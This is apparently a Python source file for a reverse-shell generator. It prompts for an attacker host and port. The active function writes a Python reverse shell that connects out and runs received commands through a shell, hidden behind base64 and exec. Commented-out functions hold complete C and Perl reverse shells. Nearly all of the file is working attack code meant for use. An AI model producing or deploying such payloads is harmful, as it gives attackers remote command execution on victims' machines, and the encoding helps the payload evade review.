#CopyRight Apache-2.0
#Powered By Python 3.X
#Author : @Aμιρ-0x0 (AMJ)
import readline , os
from colorama import Fore
import base64
def PRM():
    try:
        ip = input (Fore.RESET+"RHOST > ")
        ip = "\"%s\""%(ip)
        print (Fore.CYAN+"\nRemote HOST > %s\n"%ip)
        port = int(input(Fore.RESET+"RPORT > "))
        print (Fore.CYAN+"\nRemote PORT > %s"%port)
        name = input (Fore.RESET+"\nEnter File Name :")
        print (Fore.CYAN+"\nName OF File > %s"%name)
        print (Fore.RESET+"")

        File = open(name,'w')
        T = 'import socket'
        T += '\nimport os'
        T += '\nimport subprocess'
        T += '\ns = socket.socket()'
        T += '\ns.connect((%s,%s))'%(ip,port)
        T += '\nwhile True:'
        T += '\n\tdata = s.recv(1024)'
        T += '\n\tcd = "cd"'
        T += '\n\tif data[:2].decode("utf-8") == %s:'%'cd'
        T += '\n\t\tos.chdir(data[3:].decode("utf-8"))'
        T += '\n\tif len(data) > 0:'
        T += '\n\t\tcmd = subprocess.Popen(data[:].decode("utf-8"),shell=True, stdout=subprocess.PIPE, stdin=subprocess.PIPE, stderr=subprocess.PIPE)'
        T += '\n\t\toutput_byte = cmd.stdout.read() + cmd.stderr.read()'
        T += '\n\t\toutput_str = str(output_byte,"utf-8")'
        T += '\n\t\tcurrentWD = "> "'
        T += '\n\t\ts.send(str.encode(output_str + currentWD))'

        cmd = base64.b64encode(bytes(T, 'utf-8')) 
        cmd = cmd.decode("utf-8")

        T1 = "import base64\n"
        T1 += "exec(base64.b64decode('%s'))"%cmd
        File.write(T1)
        File.close()

    except:
        print("Unknown Error !")

"""
def CRM():
    try:
        ip = input (Fore.RESET+"RHOST > ")
        ip = "\"%s\""%(ip)
        print (Fore.CYAN+"\nRemote HOST > %s\n"%ip)
        port = int(input(Fore.RESET+"RPORT > "))
        print (Fore.CYAN+"\nRemote PORT > %s"%port)
        name = input (Fore.RESET+"\nEnter File Name :")
        print (Fore.CYAN+"\nName OF File > %s"%name)
        print (Fore.RESET+"")
        
        shell = '''
#include <stdio.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <stdlib.h>
#include <unistd.h>
#include <netinet/in.h>
#include <arpa/inet.h>

int main(void){
    char* sh = getenv("SHELL");

    int port = PORT,
        sockt = socket(AF_INET,SOCK_STREAM,0);
    struct sockaddr_in revsockaddr;
    revsockaddr.sin_family = AF_INET;
    revsockaddr.sin_port = htons(port);
    revsockaddr.sin_addr.s_addr = inet_addr(IP);

    connect(sockt, (struct sockaddr *) &revsockaddr, sizeof(revsockaddr));
    dup2(sockt, 0);
    dup2(sockt, 1);
    dup2(sockt, 2);
    char *const argv[] = {sh,NULL};

    execve(sh,argv,NULL);

    return 0;
}


        '''
        File = open("reverse.c",'w')
        File.write("#define IP %s"%(ip))
        File.write("\n#define PORT %s"%(port))
        File.write(shell)
        File.close()
        cmd = ("gcc reverse.c -o %s"%(name))
        os.system(cmd)
        print ("Reverse Shell Created .... %s"%(name))
        os.remove("reverse.c")
    except:
        print("Unknown Error !")

def PERM():
    try:
        ip = input (Fore.RESET+"RHOST > ")
        ip = "\"%s\""%(ip)
        print (Fore.CYAN+"\nRemote HOST > %s\n"%ip)
        port = int(input(Fore.RESET+"RPORT > "))
        print (Fore.CYAN+"\nRemote PORT > %s"%port)
        name = input (Fore.RESET+"\nEnter File Name :")
        print (Fore.CYAN+"\nName OF File > %s"%name)
        print (Fore.RESET+"")

        P0 = '''
#!/usr/bin/perl -w
use Socket;
use Env;
$shell = $ENV{'SHELL'};
        '''

        ipr = '\n$i = %s ;'%(ip)
        portr = '\n$p = %s ;'%(port)

        P1 = '''
socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));
if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");
open(STDOUT,">&S");
open(STDERR,">&S");
exec($shell);
};
        '''
        File = open(name,'w')
        File.write(P0)
        File.write(ipr)
        File.write(portr)
        File.write(P1)
        File.close()
    except:
        print("Unknown Error !")

"""
def RSMaker():
    PRM()
"""
    print ('''
1) Python TCP
2) C TCP
3) Perl TCP
    ''')

    Type = int(input("Enter Number OF Reverse Shell > "))

    if Type == 1:
        print ("Reverse Shell Type Python TCP\n\n")
        PRM()

    elif Type == 2:
        print ("Reverse Shell Type C TCP\n")
        CRM()

    elif Type == 3:
        print ("Reverse Shell Type Ruby TCP")
        PERM()
"""
    